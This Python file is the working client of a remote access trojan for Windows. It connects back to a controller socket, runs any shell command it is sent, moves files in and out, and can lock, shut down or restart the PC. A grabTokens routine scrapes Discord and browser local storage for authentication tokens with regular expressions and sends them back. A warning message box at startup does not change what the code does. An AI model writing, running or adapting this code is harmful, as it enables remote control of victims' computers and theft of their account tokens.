import socket, subprocess, time, json, os, base64, ctypes, os, sys, re

ctypes.windll.user32.MessageBoxW(
    0,
    "Remote PC connection started, if this wasn't done by you please check your PC for malware",
    "IMPORTANT MESSAGE",
    1,
)


class RATConnector:
    def __init__(self, ip, port):
        # Try to connect to the server, if failed wait five seconds and try again.
        while True:
            try:
                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.connection.connect((ip, port))
            except socket.error:
                time.sleep(5)
            else:
                break

    # Function for sending data as JSON
    def dataSend(self, data):
        jsonData = json.dumps(data)
        self.connection.send(jsonData.encode())

    # Function for receiving data as JSON
    def dataReceive(self):
        jsonData = b""
        while True:
            try:
                jsonData += self.connection.recv(1024)
                return json.loads(jsonData)
            # If ValueError returned then more data needs to be sent
            except ValueError:
                continue

    def arrayToString(self, s):
        convStr = ""
        for i in s:
            convStr += i
        return convStr

    # Run any command on the system
    def runCommand(self, command):
        return subprocess.check_output(
            command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL
        )

    def grabTokens(self):
        def find_tokens(path):
            path += "\\Local Storage\\leveldb"
            tokens = []
            for file_name in os.listdir(path):
                if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                    continue
                for line in [
                    x.strip()
                    for x in open(f"{path}\\{file_name}", errors="ignore").readlines()
                    if x.strip()
                ]:
                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                        for token in re.findall(regex, line):
                            tokens.append(token)
            return tokens

        loc = os.getenv("LOCALAPPDATA")
        rom = os.getenv("APPDATA")
        paths = {
            "Discord": rom + "\\Discord",
            "Discord Canary": rom + "\\discordcanary",
            "Discord PTB": rom + "\\discordptb",
            "Google Chrome": loc + "\\Google\\Chrome\\User Data\\Default",
            "Opera": rom + "\\Opera Software\\Opera Stable",
            "Brave": loc + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
            "Yandex": loc + "\\Yandex\\YandexBrowser\\User Data\\Default",
        }
        message = ""
        for platform, path in paths.items():
            if not os.path.exists(path):
                continue
            message += f"\n{platform}\n\n"
            tokens = find_tokens(path)
            if len(tokens) > 0:
                for token in tokens:
                    message += f"{token}\n"
            else:
                message += "No tokens found.\n"
            return message

    # Reading files with base 64 encryption for non UTF-8 compatability
    def readFile(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    # Writing files, decode the b64 from the above function
    def writeFile(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload complete"

    def run(self):
        while True:
            command = self.dataReceive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "ratHelp":
                    commandResponse = ""
                elif command[0] == "cd" and len(command) > 1:
                    os.chdir(command[1])
                    commandResponse = "[+] Changing active directory to " + command[1]
                elif command[0] == "upload":
                    commandResponse = self.writeFile(command[1], command[2])
                elif command[0] == "download":
                    commandResponse = self.readFile(command[1]).decode()
                elif command[0] == "message":
                    # Shows a message box with the requested message using ctypes
                    ctypes.windll.user32.MessageBoxW(
                        0, command[1], "Message from remote admin", 1
                    )
                    commandResponse = "[+] Message received by client"
                elif command[0] == "lock":
                    ctypes.windll.user32.LockWorkStation()
                    commandResponse = "[+] Clients PC locked"
                elif command[0] == "shutdown":
                    os.system("shutdown /s /t 1")
                elif command[0] == "restart":
                    os.system("shutdown /r /t 1")
                elif command[0] == "tokenGrab":
                    commandResponse = self.grabTokens()
                else:
                    convCommand = self.arrayToString(command)
                    commandResponse = self.runCommand(convCommand).decode()
            # Whole error handling, bad practice but required to keep connection
            except Exception:
                commandResponse = (
                    "[-] Error running command, check the syntax of the command."
                )
            self.dataSend(commandResponse)


ratClient = RATConnector("127.0.0.1", 4444)
ratClient.run()
